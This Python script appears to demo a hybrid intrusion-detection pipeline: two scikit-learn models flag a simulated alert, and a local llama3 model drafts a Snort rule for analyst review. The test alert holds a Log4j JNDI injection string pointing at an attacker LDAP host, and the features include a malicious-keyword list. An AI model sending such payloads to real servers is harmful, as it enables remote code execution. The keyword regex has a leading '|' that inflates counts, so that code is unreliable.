import joblib
import ollama
import pandas as pd
import re

def engineer_features_for_single_alert(alert_info):
    """
    Performs the same feature engineering on a single new alert
    that was done on the training data.
    """
    message = alert_info['message']
    
    # Create a DataFrame for the new alert
    df = pd.DataFrame([{
        'message': message,
        'dest_port': int(alert_info['dest_port'])
    }])
    
    # 1. Message Length
    df['message_length'] = df['message'].str.len()

    # 2. Special Character Count
    special_chars = r'[\$\{\}\(\)\'\/]'
    df['special_char_count'] = df['message'].str.count(special_chars)

    # 3. Malicious Keyword Count
    keywords = ['select', 'union', 'script', 'jndi', 'ldap', 'payload']
    keyword_pattern = '|' + '|'.join(keywords)
    df['keyword_count'] = df['message'].str.lower().str.count(keyword_pattern)
    
    # Return the DataFrame ready for prediction
    return df[['dest_port', 'message_length', 'special_char_count', 'keyword_count', 'message']]


def generate_snort_rule_prompt(alert_info):
    """
    Constructs a detailed prompt for Ollama to generate a Snort rule.
    """
    prompt = f"""
    As a senior cybersecurity analyst, you have been tasked with writing a Snort 3 rule.
    A new, suspicious network event has been detected with the following details:

    - **Alert Message**: "{alert_info['message']}"
    - **Source IP**: {alert_info['source_ip']}
    - **Destination Port**: {alert_info['dest_port']}
    - **Protocol**: {alert_info['protocol']}

    Based on this information, generate a Snort 3 rule that will block future attempts from this specific source IP and also try to match the content of the suspicious message.
    The rule should be in the correct Snort 3 syntax. For example:
    `alert tcp any any -> $HOME_NET 80 (msg:"..."; content:"..."; sid:1000005; rev:1;)`
    
    Provide only the Snort rule as your response.
    """
    return prompt

# --- Main Execution ---
if __name__ == "__main__":
    # 1. Load the pre-trained models
    try:
        classifier_pipeline = joblib.load('random_forest_pipeline.joblib')
        anomaly_pipeline = joblib.load('isolation_forest_pipeline.joblib')
    except FileNotFoundError as e:
        print(f"Error: Could not find a required model file: {e.filename}")
        print("Please run the 'train_model.py' script first to create both model files.")
        exit()

    # 2. Simulate a new, unseen, suspicious alert (Log4j)
    new_alert_info = {
        'message': 'GET /?payload=${jndi:ldap://192.168.1.6:1389/a} HTTP/1.1',
        'source_ip': '192.168.1.6',
        'dest_port': '8080',
        'protocol': 'tcp'
    }

    # 3. Engineer features for the new alert
    new_alert_df = engineer_features_for_single_alert(new_alert_info)

    # 4. Get predictions from BOTH models
    classifier_prediction = classifier_pipeline.predict(new_alert_df)
    # IsolationForest prediction: 1 for inlier (normal), -1 for outlier (anomaly)
    anomaly_prediction = anomaly_pipeline.predict(new_alert_df)

    print("--- Hybrid Model Analysis ---")
    print(f"Alert: '{new_alert_info['message']}'")
    print(f"Classifier (Random Forest) Prediction: {'MALICIOUS' if classifier_prediction[0] == 1 else 'Benign'}")
    print(f"Anomaly Detector (Isolation Forest) Prediction: {'ANOMALY' if anomaly_prediction[0] == -1 else 'Normal'}")
    print("-----------------------------")

    # 5. Hybrid Decision Logic: Is it malicious OR is it an anomaly?
    if classifier_prediction[0] == 1 or anomaly_prediction[0] == -1:
        print("\nSUCCESS: The hybrid system flagged the new threat as MALICIOUS.")
        
        # Determine which model triggered the alert for the report
        if classifier_prediction[0] == 1:
            print("Reason: Classifier identified a known attack pattern.")
        if anomaly_prediction[0] == -1:
            print("Reason: Anomaly detector identified a deviation from normal traffic.")

        print("\nAsking Ollama to generate a new Snort rule...")
        prompt = generate_snort_rule_prompt(new_alert_info)
        
        try:
            response = ollama.chat(
                model='llama3',
                messages=[{'role': 'user', 'content': prompt}],
                stream=False
            )
            
            suggested_rule = response['message']['content']
            print("\n--- Ollama's Suggested Snort Rule ---")
            print(suggested_rule)
            print("---------------------------------------")

            with open("suggested_rules.txt", "a") as f:
                f.write(f"# Rule for alert: {new_alert_info['message']}\n")
                f.write(suggested_rule + "\n\n")
            print("Rule saved to suggested_rules.txt for analyst review.")

        except Exception as e:
            print(f"\nError communicating with Ollama: {e}")
            print("Please ensure the Ollama service is running and you have the 'llama3' model.")
            
    else:
        print("\nFAILURE: The hybrid system classified the new threat as BENIGN.")